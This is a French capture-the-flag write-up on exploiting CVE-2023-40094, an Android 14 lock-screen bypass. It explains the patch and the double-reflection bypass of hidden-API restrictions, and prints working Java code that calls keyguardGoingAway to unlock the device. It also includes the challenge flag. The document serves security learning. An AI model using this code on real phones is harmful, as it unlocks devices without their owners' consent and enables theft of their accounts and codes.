BreizhCTF 2024 - Miroir Miroir
==========================

### TL;DR

Depuis deux années, vous traquez et espionnez un réseau de grande envergure de blanchiment d'argent. Grâce à votre travail acharné, vous avez réussi à infiltrer un agent sur le terrain. Via des techniques de social engineering, il a été capable d'obtenir le mot de passe du portefeuille crypto d'une de leurs têtes pensantes. Seulement, l'accès est protégé par une double authentification... 

Votre agent vous garantit qu'il sera capable de manipuler le criminel pour lui faire installer une application sur son téléphone Android 14, et de la lancer en arrière-plan. En se basant sur ses informations, vous déduisez qu'il serait possible d'utiliser la vulnérabilité CVE-2023-40094, pour déverrouiller le téléphone à un moment opportun et obtenir le code 2FA. Vous mettez en place un émulateur, puis commencez à développer...

*Des instructions sont disponibles dans le fichier `instructions.md`.*

### Analyse de la CVE-2023-40094

Nous décidons de suivre le chemin indiqué dans l'énoncé, en étudiant la CVE-2023-40094 :

- https://nvd.nist.gov/vuln/detail/CVE-2023-40094
> In keyguardGoingAway of ActivityTaskManagerService.java, there is a possible lock screen bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.

Nous pouvons retrouver les [commits corrigeant la vulnérabilité](https://android.googlesource.com/platform/frameworks/base/+/1120bc7e511710b1b774adf29ba47106292365e7%5E%21/#F0) : 

```diff
diff --git a/core/java/android/app/IActivityTaskManager.aidl b/core/java/android/app/IActivityTaskManager.aidl
index fe75dd3..b709b7e 100644
--- a/core/java/android/app/IActivityTaskManager.aidl
+++ b/core/java/android/app/IActivityTaskManager.aidl
@@ -239,6 +239,7 @@
      *              {@link android.view.WindowManagerPolicyConstants#KEYGUARD_GOING_AWAY_FLAG_TO_SHADE}
      *              etc.
      */
+     @JavaPassthrough(annotation="@android.annotation.RequiresPermission(android.Manifest.permission.CONTROL_KEYGUARD)")
     void keyguardGoingAway(int flags);
 
     void suppressResizeConfigChanges(boolean suppress);
```

et

```diff
diff --git a/services/core/java/com/android/server/wm/ActivityTaskManagerService.java b/services/core/java/com/android/server/wm/ActivityTaskManagerService.java
index aa15429..71ca852 100644
--- a/services/core/java/com/android/server/wm/ActivityTaskManagerService.java
+++ b/services/core/java/com/android/server/wm/ActivityTaskManagerService.java
@@ -18,6 +18,7 @@
 
 import static android.Manifest.permission.BIND_VOICE_INTERACTION;
 import static android.Manifest.permission.CHANGE_CONFIGURATION;
+import static android.Manifest.permission.CONTROL_KEYGUARD;
 import static android.Manifest.permission.CONTROL_REMOTE_APP_TRANSITION_ANIMATIONS;
 import static android.Manifest.permission.INTERACT_ACROSS_USERS;
 import static android.Manifest.permission.INTERACT_ACROSS_USERS_FULL;
@@ -3394,6 +3395,7 @@
 
     @Override
     public void keyguardGoingAway(int flags) {
+        mAmInternal.enforceCallingPermission(CONTROL_KEYGUARD, "unlock keyguard");
         enforceNotIsolatedCaller("keyguardGoingAway");
         final long token = Binder.clearCallingIdentity();
         try {
```

Nous pouvons remarquer que des fonctions liées au `keyguard` sont renforcées par un contrôle de permission. Le `keyguard` est assimilable au verrouillage de l'écran et gère son état :

- https://developer.android.com/reference/android/app/KeyguardManager
- https://stackoverflow.com/a/17689969

Enfin, nous notons également la présence de ce message dans la description du commit : 

> Manual, verify that the app which can be found on the bug can no longer call
keyguardGoingAway successfully

Notre stratégie est donc de développer une logique permettant de reproduire ce bug, afin de contrôler le (dé)verrouillage de l'écran, via la fonction `keyguardGoingAway`.

### Internal system API calls

La méthode [`keyguardGoingAway`](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/services/core/java/com/android/server/wm/ActivityTaskManagerService.java#L3582) ne fait pas partie des interfaces SDK, disponibles par exemple dans l'environnement Android Studio. Ce faisant, il n'est pas possible de compiler un code en faisant l'appel, car elle ne sera pas définie. Cependant, nous pouvons utiliser la réflexion Java pour l'appeller à l'exécution (appel dynamique). Voici quelques références explicitant ce sujet :

- https://proandroiddev.com/java-reflection-afe3d9af0d8d
- https://codegym.cc/groups/posts/45-reflection-api-reflection-the-dark-side-of-java

~~mal~~Heureusement, depuis Android 9, Google restreint les appels à certaines fonctions ne faisant pas partie du SDK classique. Les listes complètes sont disponibles ici : 

- https://developer.android.com/guide/app-compatibility/restrictions-non-sdk-interfaces#determine-list

Ainsi, [`keyguardGoingAway`](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/services/core/java/com/android/server/wm/ActivityTaskManagerService.java#L3582) se retrouve être blacklisté : 

```csv
Landroid/app/IActivityTaskManager$Default;->keyguardGoingAway(I)V,blocked
```

Voir le fichier disponible ici : https://dl.google.com/developers/android/udc/non-sdk/hiddenapi-flags.csv?hl=fr, à la ligne 23252.

### Double réflexion

Afin de contourner le filtrage mis en place, nous pouvons utiliser une technique nommée **double réflexion** :

> Double-reflection. This is a Java way. Using the system
> class to reflect, we can change the caller’s identity to be the
> system [5]. We first leverage reflection to obtain the reflection
> API, called the meta-reflection API. This meta-reflection API is
> loaded by the system class. Then, we use this meta-reflection
> API to reflect the call to the non-SDK API. At this time, the
> call to the non-SDK API will be considered a system call. In
> addition, there is a setHiddenApiExemptions() API (a non-SDK
> API) under the VMRuntime class that can be used to exempt a nonSDK API from the restriction. Combining the double-reflection
> with setHiddenApiExemptions(), all non-SDK APIs can still be
> accessed through the previous approaches (i.e., SDK replacement,
> Java reflection, and JNI).

*Source : https://diaowenrui.github.io/paper/icse22-yang.pdf*

En cherchant une librairie pour effectuer cette manipulation pour nous, nous remarquons le module Java suivant : https://github.com/LSPosed/AndroidHiddenApiBypass/.

---
Voici quelques ressources pratiques pour la mise en place de `AndroidHiddenApiBypass` : 

- https://stackoverflow.com/questions/69163511/build-was-configured-to-prefer-settings-repositories-over-project-repositories-b/71186329#71186329
- https://github.com/LSPosed/AndroidHiddenApiBypass/issues/22#issuecomment-1311182344

### Exploitation


Notre premier objectif est d'accéder à une instance `android.app.IActivityTaskManager`. Même si on pouvait l'appeler directement en double réflexion, on souhaite l'obtenir à partir d'un objet live. Pour cela, nous pouvons utiliser la méthode `getService()`, comme indiqué dans https://diaowenrui.github.io/paper/icse22-yang.pdf, dont nous nous inspirerons pour construire notre chaîne d'appels :

> getService() is the most frequently used non SDK API in malicious apps, which is designed for obtaining specific system services.

Cependant, appeler directement cette fonction n'est pas possible. En investiguant le [code source](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/core/java/android/app/ActivityManager.java#L5324), nous remarquons un autre chemin d'appel :

```java
/**
 * @hide
 */
@UnsupportedAppUsage
public static IActivityManager getService() {
    return IActivityManagerSingleton.get();
}

private static IActivityTaskManager getTaskService() {
    return ActivityTaskManager.getService();
}
```

Nous pouvons remarquer que l'une des méthodes n'est pas cachée et nous fournit une instance de `android.app.IActivityTaskManager$Stub$Proxy`, dont l'API système interne est définie dans [`android/app/IActivityTaskManager.aidl`](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/core/java/android/app/IActivityTaskManager.aidl) et implémentée dans [`services/core/java/com/android/server/wm/ActivityTaskManagerService.java`](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/services/core/java/com/android/server/wm/ActivityTaskManagerService.java) (voir https://www.protechtraining.com/static/slides/Deep_Dive_Into_Binder_Presentation.html#slide-10 pour un schéma relationnel). Fondamentalement, appeler « getTaskService » revient à appeler « getService », mais sans restriction.

Une fois que nous avons accès à l'instance live, nous pouvons utiliser la double réflexion pour appeler la méthode cachée (et non protégée) [`keyguardGoingAway`](https://github.com/aosp-mirror/platform_frameworks_base/blob/65f47a30cffcfb22774daf343ed23d5c7464a1b5/services/core/java/com/android/server/wm/ActivityTaskManagerService.java#L3582). Lorsqu'elle est appelée, l'écran de verrouillage est déverouillé, donant un accès direct à l'écran "HOME" de l'appareil.

Voici le code implémentant cette logique :

```java
Log.d("Status", "Trying to unlock...");
// Get the system service from the current activity
ActivityManager activityService = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
// Get the service task from the IActivityTaskManager object
var IActivityTaskManager_StubProxy = HiddenApiBypass.invoke(activityService.getClass(), activityService, "getTaskService");
// Check if method exists, from ActivityTaskManagerService class type
HiddenApiBypass.getDeclaredMethod(IActivityTaskManager_StubProxy.getClass(), "keyguardGoingAway", Integer.TYPE);
// Remove keyguard, "31" sets every flag
HiddenApiBypass.invoke(IActivityTaskManager_StubProxy.getClass(), IActivityTaskManager_StubProxy, "keyguardGoingAway", 31);
Log.d("Status", "Device should be unlocked !");
```

Une fois confirmation de l'exploitation, nous pouvons implémenter une boucle appelant ce code toutes les secondes, afin de déverrouiller l'écran en continu. Enfin, nous soumettons l'APK à l'émulateur distant, qui nous affiche le flag, dans la seconde capture d'écran.

---

Une version de la solution, implémentant un "trigger" à distance, via une requête HTTP, est également disponible.


### Flag

`BZHCTF{k3yGUaRD_is_l0ng_G0N3_Away_#;#}`

### Ressources additionnelles

- Flags pour `keyguardGoingAway()` : https://github.com/aosp-mirror/platform_frameworks_base/blob/034f11bb0b5f1aa9be1f6d8f6ce62bb069341729/core/java/android/view/WindowManagerPolicyConstants.java#L46
    - Flags processing : https://github.com/aosp-mirror/platform_frameworks_base/blob/034f11bb0b5f1aa9be1f6d8f6ce62bb069341729/services/core/java/com/android/server/wm/KeyguardController.java#L321 and https://github.com/aosp-mirror/platform_frameworks_base/blob/034f11bb0b5f1aa9be1f6d8f6ce62bb069341729/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java#L2798
- `getSystemService` : https://developer.android.com/reference/android/content/Context#getSystemService(java.lang.Class%3CT%3E)


### Code additionnel

```java
// List available methods (hidden or not) from android.app.IActivityTaskManager
List<Executable> methods = HiddenApiBypass.getDeclaredMethods(IActivityTaskManagerStubProxy.getClass());
for (Object method : methods) {
    Log.d("Methods", method.toString());
}
```